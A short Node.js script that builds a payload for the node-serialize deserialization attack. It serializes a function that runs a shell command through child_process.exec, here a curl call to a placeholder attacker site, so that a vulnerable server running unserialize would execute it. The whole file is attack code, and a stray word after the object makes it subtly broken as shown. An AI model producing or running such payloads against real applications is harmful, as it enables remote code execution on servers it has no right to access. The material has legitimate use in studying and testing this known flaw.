// serialize.js
var serialize = require('node-serialize')

var payload = {payload: function(){require('child_process').exec('curl yourwebsite.com', function(error, stdout, stderr){console.log(stdout)})}} callback

console.log(serialize.serialize(payload))